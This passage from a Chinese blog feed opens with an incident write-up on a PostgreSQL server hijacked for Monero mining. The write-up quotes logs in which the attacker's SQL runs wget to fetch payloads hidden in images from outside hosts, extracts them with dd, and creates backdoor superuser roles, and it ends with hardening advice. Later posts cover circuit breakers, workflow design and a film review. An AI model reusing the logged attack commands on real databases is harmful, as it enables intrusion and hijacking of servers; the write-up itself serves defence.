class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">5144 --2018-08-11 15:47:30--  http://aluka.info/x6</div><div class="line">5145 Resolving aluka.info (aluka.info)... 103.27.110.206</div><div class="line">5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected.</div><div class="line">5147 HTTP request sent, awaiting response... 200 OK</div><div class="line">5148 Length: 2758655 (2.6M)</div><div class="line">5149 Saving to: ‘xmm’</div><div class="line">5150</div><div class="line">5151      0K .......... .......... .......... .......... ..........  1%  399K 7s</div><div class="line">5152     50K .......... .......... .......... .......... ..........  3%  601K 5s</div><div class="line">5153    100K .......... .......... .......... .......... ..........  5%  592K 5s</div><div class="line">5154    150K .......... .......... .......... .......... ..........  7% 1.69M 4s</div><div class="line">5155    200K .......... .......... .......... .......... ..........  9%  754K 4s</div><div class="line">5156    250K .......... .......... .......... .......... .......... 11%  422K 4s</div><div class="line">5157    300K .......... .......... .......... .......... .......... 12%  405K 4s</div><div class="line">5158    350K .......... .......... .......... .......... .......... 14%  179K 5s</div><div class="line">5159    400K .......... .......... .......... .......... .......... 16% 81.1K 8s</div><div class="line">5160    450K .......... .......... .......... .......... .......... 18% 35.1K 13s</div><div class="line">5161    500K .......... .......... .......... .......... .......... 20%  117K 13s</div><div class="line">5162    550K .......... .......... .......... .......... .......... 22% 86.3K 14s</div><div class="line">5163    600K .......... .......... .......... .......... .......... 24%  122K 14s</div><div class="line">5164    650K .......... .......... .......... .......... .......... 25%  169K 13s</div><div class="line">5165    700K .......... .......... .......... .......... .......... 27%  171K 13s</div><div class="line">5166    750K .......... .......... .......... .......... .......... 29% 93.8K 13s</div><div class="line">5167    800K .......... .......... .......... .......... .......... 31% 94.9K 13s</div><div class="line">5168    850K .......... .......... .......... .......... .......... 33%  101K 13s</div><div class="line">5169    900K .......... .......... .......... .......... .......... 35% 53.6K 14s</div><div class="line">5170    950K .......... .......... .......... .......... .......... 37% 94.3K 14s</div><div class="line">5171   1000K .......... .......... .......... .......... .......... 38% 77.0K 13s</div><div class="line">5172   1050K .......... .......... .......... .......... .......... 40% 73.6K 13s</div><div class="line">5173   1100K .......... .......... .......... .......... .......... 42% 97.2K 13s</div><div class="line">5174   1150K .......... .......... .......... .......... .......... 44%  130K 13s</div><div class="line">5175   1200K .......... .......... .......... .......... .......... 46%  194K 12s</div><div class="line">5176   1250K .......... .......... .......... .......... .......... 48%  173K 12s</div><div class="line">5177   1300K .......... .......... .......... .......... .......... 50%  109K 11s</div><div class="line">5178   1350K .......... .......... .......... .......... .......... 51% 82.9K 11s</div><div class="line">5179   1400K .......... .......... .......... .......... .......... 53%  134K 10s</div><div class="line">5180   1450K .......... .......... .......... .......... .......... 55%  106K 10s</div><div class="line">5181   1500K .......... .......... .......... .......... .......... 57%  188K 10s</div><div class="line">5182   1550K .......... .......... .......... .......... .......... 59% 51.4K 9s</div><div class="line">5183   1600K .......... .......... .......... .......... .......... 61% 54.6K 9s</div><div class="line">5184   1650K .......... .......... .......... .......... .......... 63% 86.8K 9s</div><div class="line">5185   1700K .......... .......... .......... .......... .......... 64%  160K 8s</div><div class="line">5186   1750K .......... .......... .......... .......... .......... 66% 97.9K 8s</div><div class="line">5187   1800K .......... .......... .......... .......... .......... 68%  153K 8s</div><div class="line">5188   1850K .......... .......... .......... .......... .......... 70%  127K 7s</div><div class="line">5189   1900K .......... .......... .......... .......... .......... 72%  117K 7s</div><div class="line">5190   1950K .......... .......... .......... .......... .......... 74% 63.8K 6s</div><div class="line">5191   2000K .......... .......... .......... .......... .......... 76%  119K 6s</div><div class="line">5192   2050K .......... .......... .......... .......... .......... 77% 67.1K 5s</div><div class="line">5193   2100K .......... .......... .......... .......... .......... 79% 98.0K 5s</div><div class="line">5194   2150K .......... .......... .......... .......... .......... 81%  127K 5s</div><div class="line">5195   2200K .......... .......... .......... .......... .......... 83%  105K 4s</div><div class="line">5196   2250K .......... .......... .......... .......... .......... 85% 99.6K 4s</div><div class="line">5197   2300K .......... .......... .......... .......... .......... 87% 76.9K 3s</div><div class="line">5198   2350K .......... .......... .......... .......... .......... 89%  162K 3s</div><div class="line">5199   2400K .......... .......... .......... .......... .......... 90%  153K 2s</div><div class="line">5200   2450K .......... .......... .......... .......... .......... 92%  239K 2s</div><div class="line">5201   2500K .......... .......... .......... .......... .......... 94%  160K 1s</div><div class="line">5202   2550K .......... .......... .......... .......... .......... 96%  191K 1s</div><div class="line">5203   2600K .......... .......... .......... .......... .......... 98%  118K 0s</div><div class="line">5204   2650K .......... .......... .......... .......... ...       100% 82.4K=24s</div><div class="line">5205</div><div class="line">5206 2018-08-11 15:47:54 (111 KB/s) - ‘xmm’ saved [2758655/2758655]</div><div class="line">5207</div></pre></td></tr></table></figure>
<ol>
<li>发现更早的日志里，有两个连接从 <code>img1.imagehousing.com</code> 下载了两张图片, 并成功设置了 777 权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">23 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b524, ...</div><div class="line">24 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">25 HTTP request sent, awaiting response... 200 OK</div><div class="line">26 Length: 1571 (1.5K) [image/png]</div><div class="line">27 Saving to: ‘./conf1.dat’</div><div class="line">28</div><div class="line">29      0K .                                                     100%  368M=0s</div><div class="line">30</div><div class="line">31 2018-08-05 12:54:26 (368 MB/s) - ‘./conf1.dat’ saved [1571/1571]</div><div class="line">32</div><div class="line">33 896+0 records in</div><div class="line">34 896+0 records out</div><div class="line">35 896 bytes copied, 0.000933778 s, 960 kB/s</div><div class="line">36 chmod: cannot access &apos;./x4064410502&apos;: No such file or directory</div><div class="line">37 2018-08-05 12:54:26 CST [24806-14] pgsql@postgres LOG:  duration: 810.107 ms  statement: select fun6404402637 (&apos;wget  -c  http://img1.imagehousing.com/0/baby-942650.png -O ./conf1.dat;dd  skip=675  bs=1  if=./conf1.dat  of=config.json  ;rm -f ./conf1#</div><div class="line">38 --2018-08-05 12:54:27--  http://img1.imagehousing.com/0/cat-497532.png</div><div class="line">39 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b424, ...</div><div class="line">40 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">41 HTTP request sent, awaiting response... 200 OK</div><div class="line">42 Length: 840464 (821K) [image/png]</div><div class="line">43 Saving to: ‘ifzsvasg.jpg’</div><div class="line">44</div><div class="line">45      0K .......... .......... .......... .......... ..........  6% 81.3K 9s</div><div class="line">46     50K .......... .......... .......... .......... .......... 12%  153K 7s</div><div class="line">47    100K .......... .......... .......... .......... .......... 18% 86.2K 7s</div><div class="line">48    150K .......... .......... .......... .......... .......... 24%  635K 5s</div><div class="line">49    200K .......... .......... .......... .......... .......... 30%  138K 4s</div><div class="line">50    250K .......... .......... .......... .......... .......... 36%  139K 4s</div><div class="line">51    300K .......... .......... .......... .......... .......... 42%  146K 4s</div><div class="line">52    350K .......... .......... .......... .......... .......... 48%  176K 3s</div><div class="line">53    400K .......... .......... .......... .......... .......... 54%  194K 3s</div><div class="line">54    450K .......... .......... .......... .......... .......... 60%  189K 2s</div><div class="line">55    500K .......... .......... .......... .......... .......... 67%  179K 2s</div><div class="line">56    550K .......... .......... .......... .......... .......... 73%  178K 1s</div><div class="line">57    600K .......... .......... .......... .......... .......... 79%  187K 1s</div><div class="line">58    650K .......... .......... .......... .......... .......... 85%  191K 1s</div><div class="line">59    700K .......... .......... .......... .......... .......... 91%  132K 0s</div><div class="line">60    750K .......... .......... .......... .......... .......... 97%  202K 0s</div><div class="line">61    800K .......... ..........                                 100%  141K=5.3s</div><div class="line">62</div><div class="line">63 2018-08-05 12:54:33 (154 KB/s) - ‘ifzsvasg.jpg’ saved [840464/840464]</div><div class="line">...</div></pre></td></tr></table></figure>
<p>不禁很好奇是怎么做到的，但是又不敢把这两张图片 scp 到本地，于是起了个静态文件 serve 看了下这两张图片表面上看起来竟然是斯嘉丽约翰逊的大头照(流口水!)</p>
<p><img src="http://www.4hou.com/uploads/20180318/1521342249300199.png" alt="Scalet Jown"></p>
<p>印象里面 jpg/jpeg 图片似乎有种隐写 payload 的方法，早年作为葫芦娃种子来传播，网上查到 metaspolit 的这个<a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="external">组件</a>似乎可以实现。同时也找到了这个工具 <a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">strgdetext</a> 用来提取图片中的隐写数据，可惜提取出来后仍是一段看不懂二进制码，于是思路阻塞住了。</p>
<p>想到既然需要提取 payload, 那么数据库日志里肯定也有相应代码来做这一步，于是重新翻了下日志，果不其然，发现了真正攻击的这一步在这儿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">68 2018-08-05 12:54:34 CST [24806-15] pgsql@postgres LOG:  duration: 6705.657 ms  statement: select fun6404402637(&apos;wget  -c   http://img1.imagehousing.com/0/cat-497532.png -O ifzsvasg.jpg;dd  skip=20656  bs=1  if=./ifzsvasg.jpg  of=x4064410502;rm -f ./i#</div><div class="line">69 2018-08-05 12:54:34 CST [24845-1] postgres@postgres FATAL:  password authentication failed for user &quot;postgres&quot;</div><div class="line">70 2018-08-05 12:54:34 CST [24845-2] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 101: &quot;host    all             all              0.0.0.0/0              md5&quot;</div><div class="line">71 2018-08-05 12:54:35 CST [24806-16] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">72 2018-08-05 12:54:35 CST [24806-17] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE REPLICATION   VALID UNTIL &apos;infinity&apos;;</div><div class="line">73 2018-08-05 12:54:36 CST [24806-18] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">74 2018-08-05 12:54:36 CST [24806-19] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div><div class="line">75 2018-08-05 12:54:36 CST [24806-21] pgsql@postgres STATEMENT:  CREATE ROLE pgsql LOGIN ENCRYPTED PASSWORD &apos;md56413b16b3d0861a1d2538e8d5a5eb39c&apos;  SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div></pre></td></tr></table></figure>
<p>通过 <code>select tmp_function(cmd)</code> 的方式 执行了 下载图片 – 提取 paylod – 设置权限 – 删除图片 – 通过 payload 里的自定义代码重建了 pgsql 数据库账户 – 拿到数据库 root 权限 这一套组合拳，漂亮！</p>
<p>排查到问题之后，赶紧清空了相关文件和 dbuser，设置了 postgres superuser 本地连接的设置，禁掉了 superuser 网络连接, 翻了下斯嘉丽约翰逊的其他照片，终于长舒一口气。</p>
<p>回想起来，看看是否有其他人也遇到了「斯嘉丽攻击」, 一查发现果然果然不只我一人中招，不过看了下 <a href="https://www.exploit-db.com/" target="_blank" rel="external">exploit db</a> 里还没记录这个漏洞，对比了下时间，似乎是18年初才兴起的。</p>
<ul>
<li><a href="https://xz.aliyun.com/t/2158" target="_blank" rel="external">通过Scarlett Johansson的照片令Postgre数据库开启门罗币挖矿之旅</a></li>
<li><a href="http://www.btc112.com/Monero/21066.html" target="_blank" rel="external">斯嘉丽门罗币攻击</a></li>
</ul>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>这次主要的原因是 postgres 配置权限时偷懒导致服务器变成挖矿僵尸。</p>
<ol>
<li>postgres <code>pg_hba.conf</code> 里的用户认证 method 应改成 md5 方式</li>
<li>数据库 superuser 只配置只能 local 访问禁止远程访问</li>
<li>腾讯云安全组里数据库端口 outbound 应尽量限制 ip 段</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[坦率地讲 服务熔断 & 服务降级]]></title>
      <url>http://lexuslee.me/2018/02/01/2018-01-18-Service-fallback/</url>
      <content type="html"><![CDATA[<h2 id="坦率地讲-服务熔断-amp-服务降级"><a href="#坦率地讲-服务熔断-amp-服务降级" class="headerlink" title="坦率地讲 服务熔断 &amp; 服务降级"></a>坦率地讲 服务熔断 &amp; 服务降级</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>之前遇到个问题，发现一个系统如果拆分了太多业务类服务，或者依赖于大量的第三方服务，就很容易因为某个服务的故障导致整个系统不可用，比如</p>
<ul>
<li>模块中使用了 Elastic Search 进行监控，但是 ES 突然挂了，相关的 api 的调用报错导致级联的服务全部阻塞，那么应该要有规避由 ES 调用 raise 出的异常或者调用超时而导致整个模块或整个系统崩溃的保护措施。</li>
<li>使用 AWS 或 阿里云 的 ECS 服务来作为 micro-service 的载体，但是 ECS 服务故障或者过载了导致整个业务链无法正常进行，那么应有对应的降级或者限制调用频度的方案来进行保护。<a id="more"></a>
</li>
</ul>
<h3 id="服务熔断"><a href="#服务熔断" class="headerlink" title="服务熔断"></a>服务熔断</h3><p>服务熔断和电路熔断是一个道理，如果一条线路电压过高，保险丝会熔断，防止出现火灾，但是过后重启仍然是可用的。</p>
<p>而服务熔断则是对于目标服务的请求和调用大量超时或失败，这时应该熔断该服务的所有调用，并且对于后续调用应直接返回，从而快速释放资源，确保在目标服务不可用的这段时间内，所有对它的调用都是立即返回，不会阻塞的。再等到目标服务好转后进行接口恢复。</p>
<p>熔断的方式有很多，最出名的奶飞的 <a href="https://github.com/Netflix/Hystrix" target="_blank" rel="external">hystrix</a> 项目里有很全面的实践，这里便先列个比较偷懒的案例。</p>
<p>举个栗子，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Elastic search service decorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_trend</span><span class="params">(func)</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">    <span class="comment"># Call elastic search service to get api trend</span></div><div class="line">    elastic_search_api_call()</div><div class="line">    <span class="comment"># Custom function</span></div><div class="line">    <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">  <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="comment"># Custom task to do stuff</span></div><div class="line"><span class="meta">@api_trend</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_func</span><span class="params">(foo)</span>:</span></div><div class="line">  retrun foo()</div></pre></td></tr></table></figure>
<p>假设代码中的 <code>@api_trend</code> 是个调用 Elastic Search 服务来监控 api 执行情况的装饰器，那么如果 Elastic Search 服务挂了，则后续的 <code>custom_func(foo)</code> 也不会成功执行或者被阻塞。所以我们需要做的就是阻止后续的程序继续调用 <code>@api_trend</code> 或者 <code>elastic_search_api_call()</code> 这两位老哥，把 <code>custom_func(foo)</code> 隔离开，这样虽然暂时失去了监控，但是仍能保证业务能正常执行。</p>
<p>所以基于这点，我们可以简单地加个熔断控制器开关来隔离故障接口。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</div><div class="line"></div><div class="line"><span class="comment"># Melt down flag</span></div><div class="line">FUSE = <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="comment"># Melt down recover func</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span><span class="params">()</span>:</span></div><div class="line">  FUSE = <span class="keyword">True</span></div><div class="line">  <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="comment"># Melt down decorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">melt_down</span><span class="params">(threshold=<span class="number">5</span>, inteval=<span class="number">60</span>, timeout=<span class="number">300</span>, recover_time=<span class="number">3600</span>)</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">wrap_melt</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">      is_fuse = <span class="keyword">True</span></div><div class="line">      <span class="keyword">while</span> threshold &gt; <span class="number">0</span> <span class="keyword">and</span> is_fuse:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">          func(timeout, *args, **kwargs)</div><div class="line">          is_fuse = <span class="keyword">False</span></div><div class="line">        exception Exception, e:</div><div class="line">          is_fuse = <span class="keyword">True</span></div><div class="line">          threshold -= <span class="number">1</span></div><div class="line">          <span class="keyword">continue</span></div><div class="line">        time.sleep(inteval)</div><div class="line">      FUSE = is_fuse</div><div class="line">      <span class="keyword">if</span> <span class="keyword">not</span> FUSE:</div><div class="line">        tr = threading.Timer(recover_time, recover)</div><div class="line">    	tr.start()</div><div class="line">      <span class="keyword">return</span> FUSE</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line">  <span class="keyword">return</span> wrap_melt</div><div class="line"></div><div class="line"><span class="comment"># Elastic search service decorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_trend</span><span class="params">(func)</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">    <span class="comment"># Call elastic search service to get api trend</span></div><div class="line">    <span class="keyword">if</span> FUSE:</div><div class="line">    	elastic_search_api_call()</div><div class="line">    <span class="comment"># Custom function</span></div><div class="line">    <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">  <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="comment"># Custom task to do stuff</span></div><div class="line"><span class="meta">@melt_down</span></div><div class="line"><span class="meta">@api_trend</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_func</span><span class="params">(foo)</span>:</span></div><div class="line">  <span class="keyword">return</span> foo()</div></pre></td></tr></table></figure>
<p>通过在调用 <code>@api_trend</code> 之前加上熔断控制器，进行目标服务的接口调用，如果在规定的重试次数内均未成功，则认为该服务在这一段时间内不可用，对于该 api 的所有调用全都用一个 FUSE_FLAG 进行隔离，并且设置一个定时 Thread, 在一定时间后重新打开 FUSE_FLAG，恢复目标服务的调用。</p>
<h3 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h3><p>当服务器压力剧增的情况下，根据当前业务情况及流量对一些服务和页面有策略的降级，以此释放服务器资源以保证核心任务的正常运行。</p>
<p>对于复杂系统而言，会有很多的微服务通过 rpc 调用，从而产生一个业务需要一条很长的调用链，其中任何一环故障了都会导致整个调用链失败或超时而导致业务服务不可用或阻塞。</p>
<p>这种情况下，可以暂时去掉调用链中故障的服务来进行降级，其中降级策略又有很多种，比如限流，接口拒绝等，这里就挑个简单的来举栗。</p>
<p>比如一个电商系统，用户模块，商品模块，订单模块，支付模块，物流模块分别是5个存在相互依赖性的服务，但是如果用户要下单购买个商品则可能需要一条长调用链依次 Call 到这5个模块。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Call chain</span></div><div class="line">user = UserModule.sender.get_user()</div><div class="line">product = ProductModule.sender.get_product(user.selected)</div><div class="line">order = OrderModule.sender.post_order(product)</div><div class="line">payment = PaymentModule.sender.post_payment(order)</div><div class="line">logistics = LogisticsModule.sender.post_logistics(payment)</div></pre></td></tr></table></figure>
<p>这时候如果物流模块崩了，那么很可能在最终购买商品的流程会被回滚，导致用户购买商品不成功，然而实际上，物流模块即便失效，仍应允许进行商品查看，下单，购买等，所以，坦率地讲，我们应该对这5个模块进行一个上下游依赖的剥离，使之变为纯净的 rpc 调用。</p>
<p>简单地说，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> xmlrpclib <span class="keyword">import</span> ServerProxy </div><div class="line"></div><div class="line">MODULE_TO_ENABLE = [</div><div class="line">  <span class="string">'UserAgent'</span>,</div><div class="line">  <span class="string">'ProductAgent'</span>,</div><div class="line">  <span class="string">'OrderAgent'</span>,</div><div class="line">  <span class="string">'PaymentAgent'</span>,</div><div class="line">  <span class="string">'LogisticsAgent'</span></div><div class="line">]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_call</span><span class="params">()</span>:</span></div><div class="line">  <span class="keyword">return</span> foo()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_nothing</span><span class="params">()</span>:</span></div><div class="line">  <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogisticsAgent</span><span class="params">(object)</span>:</span></div><div class="line">  self.sender = ServerProxy(<span class="string">"http://&#123;host&#125;:&#123;port&#125;"</span>.format(host=host, port=port))</div><div class="line">  <span class="keyword">if</span> self.__class__.__name__ <span class="keyword">in</span> MODULE_TO_ENABLE:</div><div class="line">  	self.sender.call = custom_call</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    self.sender.call = call_nothing</div><div class="line">  <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="comment"># Call chain</span></div><div class="line"><span class="keyword">if</span> self.current_agent <span class="keyword">not</span> <span class="keyword">in</span> MODULE_TO_ENABLE:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>这样通过 diable Call chain 中不重要的一环来确保其他模块可以正常使用。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[浅谈 Workflow 设计]]></title>
      <url>http://lexuslee.me/2017/12/03/workflow-design/</url>
      <content type="html"><![CDATA[<h2 id="浅谈-Workflow-设计"><a href="#浅谈-Workflow-设计" class="headerlink" title="浅谈 Workflow 设计"></a>浅谈 Workflow 设计</h2><div style="text-align: right">LexusLee</div>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近刚接触到 workflow 相关的东西，之前都没有造过这方面的轮子，所以看了一些框架总结了一下我认为的好的 Workflow 的设计应该是怎样的。</p>
<h3 id="什么是-Workflow"><a href="#什么是-Workflow" class="headerlink" title="什么是 Workflow ?"></a>什么是 Workflow ?</h3><p>Workflow 是一些可重复执行的事件按特定的顺序&amp;路径组合成的事件流，这个组成的事件流通常是为了满足某一个流程较长的任务。</p>
<p>这些事件通常是不可再被细分，是具有原子性的。每个原子事件可能包含执行任务、文档或数据。这些事件按照提前声明好的规则组合起来就成了一个 Workflow .</p>
<p>e.g. <img src="http://media.tumblr.com/457d00b6561a83fbfdda280e58182620/tumblr_inline_mmuadskv9P1qz4rgp.png" alt="workflow_example"></p>
<p>如上图所示，Workflow 类似软件工程中的流程图，指定了每个节点可能出现的路径分支，节点执行的事情以及节点的终结状态。</p>
<h3 id="如何设计-Workflow"><a href="#如何设计-Workflow" class="headerlink" title="如何设计 Workflow ?"></a>如何设计 Workflow ?</h3><p>比较经典的 Workflow design pattern 应该满足以下几个元素：</p>
<ul>
<li>路径覆盖</li>
<li>事件原子性</li>
<li>有效的状态迁移</li>
</ul>
<h4 id="路径覆盖"><a href="#路径覆盖" class="headerlink" title="路径覆盖"></a>路径覆盖</h4><p>路径覆盖是和节点状态相关的，通常的节点状态有如下几种：</p>
<ul>
<li>Start  —— 开始 jobs ，标明 workflow 起点</li>
<li>Maybe —— 表示这个任务可能会执行，但不一定会执行，它的执行依赖于一定条件，比如上层节点的输出</li>
<li>Likely —— 和 Maybe 节点类似，但是比它的优先级更高，是作为与 Maybe 节点共享父节点的默认路径节点</li>
<li>Future —— 表示 workflow 执行体认为该路径一定会到达的节点，Future 节点的任务在不被 cancel 的情况下一定会执行</li>
<li>Waiting —— 表示当前任务是个阻塞任务，还在执行中，需要等待执行完毕才能进入下个路径</li>
<li>Ready —— 表示 Waiting 节点的任务已执行完，作为 Waiting 节点的 handler </li>
<li>Complete —— 表示整个 workflow 的 Jobs 已经全部执行完毕，为终结节点</li>
<li>Cancel —— 表示任务被明确终止了，在状态迁移过程中不作为最终状态</li>
</ul>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/workflow%20state.png" alt="path coverage"></p>
<h4 id="事件原子性"><a href="#事件原子性" class="headerlink" title="事件原子性"></a>事件原子性</h4><p><code>pass</code></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[《向阳处的她》浩介先生终于有猫啦！]]></title>
      <url>http://lexuslee.me/2017/09/25/2017-09-25-Girl-in-the-sunny-place/</url>
      <content type="html"><![CDATA[<h2 id="《向阳处的她》浩介先生终于有猫啦！"><a href="#《向阳处的她》浩介先生终于有猫啦！" class="headerlink" title="《向阳处的她》浩介先生终于有猫啦！"></a>《向阳处的她》浩介先生终于有猫啦！</h2><p>有一年的搞笑诺贝尔物理学奖颁给了课题：</p>
<p>「一只猫能同时处于固体状态和液体状态吗？」</p>
<p>通过第三人称视角研究了猫的各种形态，《向阳处的她》这部电影就给研究了一个狠狠的耳光。</p>
<a id="more"></a>
<center><br><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=5042210&auto=1&height=66"></iframe><br></center>


<p>初看预告的时候，我觉得剧情有点俗气了，尽是那些小年轻喜欢听的清新治愈系故事。</p>
<p><img src="http://img2.a0bi.com/upload/gw/movie/20151218/2154920242.jpg" alt="江之岛"></p>
<p>从大笨钟一样有仪式感的电车中眺望初冬阳光下的漫无边际的江之岛，海鸥擦着行人的帽檐飞过，整个江之岛臣服在他们身后清冽的疾风中，满心都是光怪陆离的感觉。</p>
<p>在整部电影边缘哑光的胶片镜头下，这种自然和工艺碰撞的部分，让男主浩介和女主真绪在一起的每一刻回忆都清晰起来。</p>
<p>想起了有间破旧的猫屋，在清晨穿过黑黢黢的山路，第一次遇见了那只俄罗斯蓝猫，灰扑扑毛绒绒的。</p>
<p>雾气和露水都凉，它却暖乎乎的，抱在手里，甜蜜轻佻地抬头望着你。</p>
<p>这样的眼波，实在太熟悉了。</p>
<p>这也算每个猫奴的终极梦想吧，</p>
<p>能和自己的主子一起享受这些瞬间，吃酒抱猫，真是快意。</p>
<p>不过作为一只猫来说，它能记住的东西寥寥。</p>
<p>真绪也是。</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/maowu.png" alt="猫屋"></p>
<p>真绪和浩介只能讲一个阅后即焚的故事，讲完了，便谁也记不得了。</p>
<p>一整个篇幅的起承转合喜怒哀乐，长的看不见头，甜的美不胜收，却就这么消失了，空虚极了。</p>
<p>所以，我喜欢一切永恒的事物，结局一定要是完美的，相逢在爱乐之城最后淡蓝色的酒吧里，高司令一定要冲下去，拉着她的手，说出另一个时间线里的那句话，”天呐我的老伙计啊我们在一起吧我再也不要错过你！”</p>
